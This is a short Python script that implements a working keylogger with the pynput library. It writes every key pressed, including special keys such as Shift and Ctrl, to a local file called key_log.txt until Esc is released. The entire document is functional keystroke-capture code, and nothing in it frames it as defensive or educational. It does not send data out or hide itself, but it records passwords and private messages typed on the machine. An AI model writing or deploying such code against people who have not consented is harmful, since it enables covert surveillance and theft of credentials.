from pynput import keyboard

# Specify the log file where keystrokes will be saved
log_file = "key_log.txt"

# function to be called when a key is pressed
def on_press(key):
    try:
        # Log the key press event
        with open(log_file, "a") as log:
            log.write(f"{key.char}")
    except AttributeError:
        # Handle special keys like Shift, Ctrl, etc.
        with open(log_file, "a") as log:
            log.write(f" [{key}] ")

def on_release(key):
    # Stop logging when the Esc key is released
    if key == keyboard.Key.esc:
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
